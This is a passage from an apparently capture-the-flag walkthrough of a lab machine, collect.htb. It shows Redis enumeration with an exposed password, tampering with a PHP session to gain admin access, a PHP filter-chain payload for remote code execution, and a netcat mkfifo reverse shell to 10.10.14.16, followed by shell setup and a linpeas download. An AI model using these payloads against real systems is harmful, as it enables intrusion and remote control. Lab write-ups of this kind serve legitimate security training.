gcc_version:10.2.1
process_id:957
run_id:86f74b75469abc2105032100816f01ce6009eb2f
tcp_port:6379
uptime_in_seconds:70275
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:9220090
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
```

```c
collect.htb:6379> CONFIG GET *
  1) "rdbchecksum"
  2) "yes"
  3) "daemonize"
  4) "no"
  5) "io-threads-do-reads"
  6) "no"
  7) "lua-replicate-commands"
  8) "yes"
  9) "always-show-logo"
 10) "yes"
 11) "protected-mode"
 12) "yes"
 13) "rdbcompression"
 14) "yes"
 15) "rdb-del-sync-files"
 16) "no"
 17) "activerehashing"
 18) "yes"
 19) "stop-writes-on-bgsave-error"
 20) "yes"
 21) "dynamic-hz"
 22) "yes"
 23) "lazyfree-lazy-eviction"
 24) "no"
 25) "lazyfree-lazy-expire"
 26) "no"
 27) "lazyfree-lazy-server-del"
 28) "no"
 29) "lazyfree-lazy-user-del"
 30) "no"
 31) "repl-disable-tcp-nodelay"
 32) "no"
 33) "repl-diskless-sync"
 34) "no"
 35) "gopher-enabled"
 36) "no"
 37) "aof-rewrite-incremental-fsync"
 38) "yes"
 39) "no-appendfsync-on-rewrite"
 40) "no"
 41) "cluster-require-full-coverage"
 42) "yes"
 43) "rdb-save-incremental-fsync"
 44) "yes"
 45) "aof-load-truncated"
 46) "yes"
 47) "aof-use-rdb-preamble"
 48) "yes"
 49) "cluster-replica-no-failover"
 50) "no"
 51) "cluster-slave-no-failover"
 52) "no"
 53) "replica-lazy-flush"
 54) "no"
 55) "slave-lazy-flush"
 56) "no"
 57) "replica-serve-stale-data"
 58) "yes"
 59) "slave-serve-stale-data"
 60) "yes"
 61) "replica-read-only"
 62) "yes"
 63) "slave-read-only"
 64) "yes"
 65) "replica-ignore-maxmemory"
 66) "yes"
 67) "slave-ignore-maxmemory"
 68) "yes"
 69) "jemalloc-bg-thread"
 70) "yes"
 71) "activedefrag"
 72) "no"
 73) "syslog-enabled"
 74) "no"
 75) "cluster-enabled"
 76) "no"
 77) "appendonly"
 78) "no"
 79) "cluster-allow-reads-when-down"
 80) "no"
 81) "aclfile"
 82) ""
 83) "unixsocket"
 84) ""
 85) "pidfile"
 86) "/var/run/redis/redis-server.pid"
 87) "replica-announce-ip"
 88) ""
 89) "slave-announce-ip"
 90) ""
 91) "masteruser"
 92) ""
 93) "masterauth"
 94) ""
 95) "cluster-announce-ip"
 96) ""
 97) "syslog-ident"
 98) "redis"
 99) "dbfilename"
100) "dump.rdb"
101) "appendfilename"
102) "appendonly.aof"
103) "server_cpulist"
104) ""
105) "bio_cpulist"
106) ""
107) "aof_rewrite_cpulist"
108) ""
109) "bgsave_cpulist"
110) ""
111) "ignore-warnings"
112) "ARM64-COW-BUG"
113) "supervised"
114) "systemd"
115) "syslog-facility"
116) "local0"
117) "repl-diskless-load"
118) "disabled"
119) "loglevel"
120) "notice"
121) "maxmemory-policy"
122) "noeviction"
123) "appendfsync"
124) "everysec"
125) "oom-score-adj"
126) "no"
127) "databases"
128) "16"
129) "port"
130) "6379"
131) "io-threads"
132) "1"
133) "auto-aof-rewrite-percentage"
134) "100"
135) "cluster-replica-validity-factor"
136) "10"
137) "cluster-slave-validity-factor"
138) "10"
139) "list-max-ziplist-size"
140) "-2"
141) "tcp-keepalive"
142) "300"
143) "cluster-migration-barrier"
144) "1"
145) "active-defrag-cycle-min"
146) "1"
147) "active-defrag-cycle-max"
148) "25"
149) "active-defrag-threshold-lower"
150) "10"
151) "active-defrag-threshold-upper"
152) "100"
153) "lfu-log-factor"
154) "10"
155) "lfu-decay-time"
156) "1"
157) "replica-priority"
158) "100"
159) "slave-priority"
160) "100"
161) "repl-diskless-sync-delay"
162) "5"
163) "maxmemory-samples"
164) "5"
165) "timeout"
166) "0"
167) "replica-announce-port"
168) "0"
169) "slave-announce-port"
170) "0"
171) "tcp-backlog"
172) "511"
173) "cluster-announce-bus-port"
174) "0"
175) "cluster-announce-port"
176) "0"
177) "repl-timeout"
178) "60"
179) "repl-ping-replica-period"
180) "10"
181) "repl-ping-slave-period"
182) "10"
183) "list-compress-depth"
184) "0"
185) "rdb-key-save-delay"
186) "0"
187) "key-load-delay"
188) "0"
189) "active-expire-effort"
190) "1"
191) "hz"
192) "10"
193) "min-replicas-to-write"
194) "0"
195) "min-slaves-to-write"
196) "0"
197) "min-replicas-max-lag"
198) "10"
199) "min-slaves-max-lag"
200) "10"
201) "maxclients"
202) "10000"
203) "active-defrag-max-scan-fields"
204) "1000"
205) "slowlog-max-len"
206) "128"
207) "acllog-max-len"
208) "128"
209) "lua-time-limit"
210) "5000"
211) "cluster-node-timeout"
212) "15000"
213) "slowlog-log-slower-than"
214) "10000"
215) "latency-monitor-threshold"
216) "0"
217) "proto-max-bulk-len"
218) "536870912"
219) "stream-node-max-entries"
220) "100"
221) "repl-backlog-size"
222) "1048576"
223) "maxmemory"
224) "0"
225) "hash-max-ziplist-entries"
226) "512"
227) "set-max-intset-entries"
228) "512"
229) "zset-max-ziplist-entries"
230) "128"
231) "active-defrag-ignore-bytes"
232) "104857600"
233) "hash-max-ziplist-value"
234) "64"
235) "stream-node-max-bytes"
236) "4096"
237) "zset-max-ziplist-value"
238) "64"
239) "hll-sparse-max-bytes"
240) "3000"
241) "tracking-table-max-keys"
242) "1000000"
243) "repl-backlog-ttl"
244) "3600"
245) "auto-aof-rewrite-min-size"
246) "67108864"
247) "tls-port"
248) "0"
249) "tls-session-cache-size"
250) "20480"
251) "tls-session-cache-timeout"
252) "300"
253) "tls-cluster"
254) "no"
255) "tls-replication"
256) "no"
257) "tls-auth-clients"
258) "yes"
259) "tls-prefer-server-ciphers"
260) "no"
261) "tls-session-caching"
262) "yes"
263) "tls-cert-file"
264) ""
265) "tls-key-file"
266) ""
267) "tls-dh-params-file"
268) ""
269) "tls-ca-cert-file"
270) ""
271) "tls-ca-cert-dir"
272) ""
273) "tls-protocols"
274) ""
275) "tls-ciphers"
276) ""
277) "tls-ciphersuites"
278) ""
279) "logfile"
280) "/var/log/redis/redis-server.log"
281) "client-query-buffer-limit"
282) "1073741824"
283) "watchdog-period"
284) "0"
285) "dir"
286) "/var/lib/redis"
287) "save"
288) "900 1 300 10 60 10000"
289) "client-output-buffer-limit"
290) "normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60"
291) "unixsocketperm"
292) "0"
293) "slaveof"
294) ""
295) "notify-keyspace-events"
296) ""
297) "bind"
298) "0.0.0.0 ::1"
299) "requirepass"
300) "COLLECTR3D1SPASS"
301) "oom-score-adj-values"
302) "0 200 800"
```

```c
collect.htb:6379> INFO keyspace
# Keyspace
db0:keys=2,expires=2,avg_ttl=637150
```

```c
collect.htb:6379> SELECT 0
OK
```

```c
collect.htb:6379> KEYS *
1) "PHPREDIS_SESSION:qagfa0hsfrb72bn7hnqqebokp5"
2) "PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b"
```

```c
collect.htb:6379> GET PHPREDIS_SESSION:qagfa0hsfrb72bn7hnqqebokp5
(nil)
```

```c
collect.htb:6379> GET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b
"username|s:6:\"barfoo\";role|s:5:\"admin\";"
```

```c
collect.htb:6379> SET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b "username|s:6:\"barfoo\";role|s:5:\"admin\";auth|s:4:\"True\";"
OK
```

After refreshing the page and settig the correct cookie, the one I recently changed, I was logged in.

> http://developers.collect.htb/?page=home

## Foothold

> https://github.com/synacktiv/php_filter_chain_generator

```c
$ wget https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py
--2022-12-04 17:54:08--  https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8741 (8.5K) [text/plain]
Saving to: ‘php_filter_chain_generator.py’

php_filter_chain_generator.py                              100%[========================================================================================================================================>]   8.54K  --.-KB/s    in 0.001s  

2022-12-04 17:54:08 (9.47 MB/s) - ‘php_filter_chain_generator.py’ saved [8741/8741]
```

```c
$ python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'                                                                                                                     
[+] The following gadget chain will generate the following code : <?= exec($_GET[0]); ?> (base64 value: PD89IGV4ZWMoJF9HRVRbMF0pOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

> http://developers.collect.htb/?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=id

```c
uid=33(www-data) gid=33(www-data) groups=33(www-data)�B�0���>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@ 
```

Reverse Shell Payload:

```c
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 9001 >/tmp/f
```

URL Encoded Reverse Shell Payload:

```c
rm%20/tmp/f%3bmkfifo%20/tmp/f%3bcat%20/tmp/f%7c/bin/sh%20%2di%202%3e%261%7cnc%2010.10.14.16%209001%20%3e/tmp/f
```

Final Reverse Shell Payload:

```c
http://developers.collect.htb/?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=rm%20/tmp/f%3bmkfifo%20/tmp/f%3bcat%20/tmp/f%7c/bin/sh%20%2di%202%3e%261%7cnc%2010.10.14.16%209001%20%3e/tmp/f
```

```c
$ bash
```

```c
$ nc -lnvp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.129.105.58.
Ncat: Connection from 10.129.105.58:39690.
/bin/sh: 0: can't access tty; job control turned off
$
```

## Enumeration

Get a comfy shell first.

```c
$ nc -lnvp 9001                                                                                                                                                                                                                           
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.129.105.58.
Ncat: Connection from 10.129.105.58:56458.
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@pollution:~/developers$ ^Z
[1]+  Stopped                 nc -lnvp 9001

$ stty raw -echo                                                                                                                                                                                                                          

$                                                                                                                                                                                                                                         
nc -lnvp 9001

www-data@pollution:~/developers$ export XTERM=xterm
www-data@pollution:~/developers$
```

### Linpeas

```c
$ wget https://github.com/carlospolop/PEASS-ng/releases/download/20221204/linpeas.sh
--2022-12-04 19:00:52--  https://github.com/carlospolop/PEASS-ng/releases/download/20221204/linpeas.sh
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/4ad716ad-713d-45d6-99b6-235ff2bbf8cb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20221204%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20221204T175236Z&X-Amz-Expires=300&X-Amz-Signature=1f16810181684340863eb9391c7b68297a1037fc1a71fc6b927e28ea464d0a6d&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=165548191&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
--2022-12-04 19:00:52--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/4ad716ad-713d-45d6-99b6-235ff2bbf8cb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20221204%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20221204T175236Z&X-Amz-Expires=300&X-Amz-Signature=1f16810181684340863eb9391c7b68297a1037fc1a71fc6b927e28ea464d0a6d&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=165548191&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 827827 (808K) [application/octet-stream]
Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[========================================================================================================================================>] 808.42K  4.10MB/s    in 0.2s    

